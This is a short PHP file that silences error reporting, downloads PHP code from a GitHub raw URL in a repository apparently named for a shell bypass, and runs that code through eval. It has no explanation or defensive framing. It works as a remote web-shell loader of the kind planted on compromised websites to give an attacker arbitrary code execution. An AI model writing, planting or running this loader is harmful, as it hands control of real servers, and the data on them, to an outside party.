<?php
error_reporting(0);
$url = 'https://raw.githubusercontent.com/mangoleh098/shellbypas/refs/heads/main/bypasspw.php';
$kode = file_get_contents($url);
eval('?>' . $kode);
?>
